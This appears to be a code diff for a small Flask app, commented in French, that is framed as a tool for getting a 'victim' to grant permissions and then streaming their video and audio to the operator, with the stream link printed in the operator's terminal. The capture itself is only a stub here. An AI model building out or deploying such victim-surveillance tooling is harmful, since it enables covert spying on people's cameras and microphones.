@@ -2,7 +2,6 @@ from flask import Flask, render_template, request, jsonify
 import socket
 import random
 import pyfiglet
-import threading
 import os
 
 # Créer une interface ASCII art avec pyfiglet
@@ -27,9 +26,6 @@ display_interface()
 
 # Création de l'application Flask
 app = Flask(__name__)
-
-# Stockage global pour le lien de flux généré
-generated_stream_url = None
 
 # Obtenir l'adresse IP locale
 def get_local_ip():
@@ -70,34 +66,21 @@ def victim_permission():
 # Route pour démarrer le flux après l'autorisation de la victime
 @app.route("/start_stream", methods=["POST"])
 def start_stream():
-    global generated_stream_url
     local_ip = get_local_ip()
-    port = get_random_port()
-    
-    # Lien du flux généré
+    port = get_random_port()  # Le port change à chaque fois
     stream_url = f"http://{local_ip}:{port}/stream"
-    generated_stream_url = stream_url  # Stocke le lien côté serveur
-    
-    # Affiche le lien dans le terminal
-    print(f"[INFO] Nouveau lien de flux pour toi : {stream_url}")
-    
-    # Message de confirmation pour la victime
-    return jsonify({"message": "Flux démarré. Merci d'accorder les autorisations !"})
+
+    # Afficher le lien dans le terminal pour l'utilisateur
+    print(f"Voir le flux en direct ici : {stream_url}")
+
+    # Retourner une réponse à la victime
+    return jsonify({"message": "Flux démarré", "stream_url": stream_url})
 
 # Route pour afficher le flux vidéo et audio
 @app.route("/stream")
 def stream():
-    # Ici, vous pouvez afficher un flux vidéo/audio
+    # Ici, vous pouvez utiliser une solution pour afficher les flux vidéo et audio
     return render_template("stream.html")
-
-# Route pour récupérer le lien de flux généré (utile pour toi)
-@app.route("/get_stream_url")
-def get_stream_url():
-    global generated_stream_url
-    if generated_stream_url:
-        return jsonify({"stream_url": generated_stream_url})
-    else:
-        return jsonify({"error": "Aucun flux n'est disponible pour le moment."})
 
 if __name__ == "__main__":
     local_ip = get_local_ip()
